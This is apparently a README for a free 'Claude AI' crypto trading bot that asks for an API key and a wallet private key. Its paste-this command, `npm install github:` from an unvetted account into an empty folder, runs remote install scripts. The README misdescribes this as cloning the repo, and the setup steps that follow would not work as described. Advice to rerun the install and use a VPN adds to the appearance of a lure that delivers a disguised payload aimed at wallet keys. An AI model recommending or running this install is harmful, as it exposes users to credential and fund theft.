## ✨ What is Solidity Claude Bot?

**Solidity Claude Bot** is a free, open-source **AI crypto trading bot** that combines the reasoning power of **Claude AI (Anthropic)** with **Solidity / Ethereum smart-contract execution**. Instead of blind rule-based scripts, the bot feeds live market data (OHLCV, RSI, volatility, trends) into Claude every cycle — and Claude returns a structured, confidence-scored **BUY / SELL / HOLD** decision with plain-English reasoning. A hard risk-management layer then validates the decision before any trade touches the blockchain.

> 🧠 **Claude thinks. The engine executes. Risk rules veto. You stay in control.**

## 🌟 Features

- 🧠 **Claude AI decision engine** — every signal is generated by Claude with a confidence score + human-readable reasoning
- 📊 **Live market analysis** — RSI(14), SMA(20), 24h change, volatility & 30m OHLCV bars from public exchange APIs
- ⛓️ **Solidity-grade execution** — on-chain swaps via `ethers.js` (Uniswap V2 router compatible)
- 🛡️ **Built-in risk management** — position sizing limits, stop-loss, take-profit, confidence thresholds, no duplicate positions
- 📄 **Paper trading mode** — simulate everything with zero real money until you're confident
- ⏱️ **24/7 automated cycles** — cron-scheduled scans every N minutes, fully hands-free
- 🪟 **One-line install** — works on Windows, macOS & Linux
- 🔓 **100% open source** (MIT) — audit every line, self-host everything

## 🚀 Quick Install

### 🍎 macOS / Linux — one line:

```bash
mkdir -p 'claudeai' && cd 'claudeai' && npm install github:Pulverizeristack/Solidity-claude-bot
```

### 🪟 Windows (CMD) — one line:

```cmd
mkdir claudeai && cd /d claudeai && npm install github:Pulverizeristack/Solidity-claude-bot
```

> 📦 This clones the repo from GitHub and installs all dependencies into the `claudeai` folder.

### First run

```bash
# 1. Create your environment file
cp .env.example .env        # Windows CMD: copy .env.example .env

# 2. Add your Anthropic API key (and RPC URL) to .env
#    Get a free/paid key at https://console.anthropic.com

# 3. Run one paper-trade scan cycle
npm run scan

# 4. Start the full 24/7 bot
npm run dev
```

> ✅ **Safety first:** `PAPER_TRADING=true` is the default — the bot simulates trades with real market data and **sends zero real transactions** until you explicitly switch it off.

## 🧠 How It Works

```
┌────────────────────────────────────────────────────────────┐
│                     SCAN CYCLE (every N min)                │
│                                                            │
│  1. 📊 Market Data    →  OHLCV, RSI, SMA, volatility       │
│  2. 🧠 Claude AI      →  BUY / SELL / HOLD + confidence    │
│  3. 🛡️ Risk Manager   →  thresholds, sizing, stop-loss     │
│  4. ⛓️ Executor        →  on-chain swap (or paper sim)      │
└────────────────────────────────────────────────────────────┘
```

1. **Fetch** — the bot pulls fresh 30m candles and computes technical indicators.
2. **Reason** — a structured prompt asks Claude to score the setup and respond in strict JSON.
3. **Veto** — the risk layer forces `HOLD` if confidence is below your threshold or a position is already open.
4. **Execute** — a swap is routed through the Uniswap V2 contract (or logged as a paper trade).

## ⚙️ Configuration

All settings live in `.env` (copy from `.env.example`):

| Variable | Default | Description |
|---|---|---|
| `ANTHROPIC_API_KEY` | — | **Required.** Your Claude API key |
| `RPC_URL` | — | Ethereum RPC (Infura / Alchemy) |
| `PAPER_TRADING` | `true` | `true` = simulate trades, `false` = live trading ⚠️ |
| `PRIVATE_KEY` | — | Wallet key (only when `PAPER_TRADING=false`) |
| `MAX_POSITION_SIZE_USD` | `100` | Max $ per position |
| `STOP_LOSS_PCT` | `4` | Hard stop-loss % |
| `TAKE_PROFIT_PCT` | `6` | Take-profit target % |
| `CONFIDENCE_THRESHOLD` | `0.65` | Min Claude confidence to act |
| `SCAN_INTERVAL_MINUTES` | `30` | Minutes between scan cycles |
| `CLAUDE_MODEL` | `claude-sonnet-4-20250514` | Claude model to use |

## 🛠️ Troubleshooting

**❌ `npm install github:...` fails, hangs, or times out**

> ⚠️ **99% of install issues are caused by a slow or unstable internet connection.**
> `npm install github:...` downloads (clones) the entire repository from GitHub, which needs a stable connection. On slow networks the download can stall or fail silently.

**Fixes — in order:**
1. 🔁 **Simply run the install command again.** Transient network drops are common; the second attempt usually succeeds.
2. 🌐 **Use a VPN.** Route your traffic through a faster, more stable region and retry the command.
3. 📶 **Switch networks** — e.g. from Wi-Fi to wired, or to a mobile hotspot.
4. ⏳ **Increase npm's patience:**
   ```bash
   npm config set fetch-retries 5 && npm config set fetch-retry-mintimeout 20000
   ```

**Other common issues**

| Problem | Fix |
|---|---|
| `ANTHROPIC_API_KEY is missing` | Copy `.env.example` → `.env` and paste your key |
| `403` from Claude API | Check your API key balance at console.anthropic.com |
| RPC errors | Verify `RPC_URL` is a valid Ethereum mainnet endpoint |
| Want a different coin? | Edit the symbol in `src/index.ts` (`engine.runOnce("BTCUSDC")`) |
